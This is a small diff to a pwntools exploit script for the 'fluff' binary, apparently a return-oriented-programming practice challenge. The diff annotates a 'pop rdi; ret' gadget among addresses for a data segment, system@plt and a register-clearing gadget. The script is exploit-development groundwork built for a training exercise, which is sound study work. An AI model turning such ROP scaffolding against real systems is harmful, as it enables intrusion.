@@ -6,7 +6,7 @@ t = pwn.process("./fluff")
 
 pwn.gdb.attach(t)
 
-popRDI = 0x4008c3
+popRDI = 0x4008c3 # pop rdi; ret;
 data_seg = 0x6010d0
 system_plt = 0x4005e0
 clearR11 = 0x400822 #xor r11, r11; pop r14; mov edi, junk; ret;
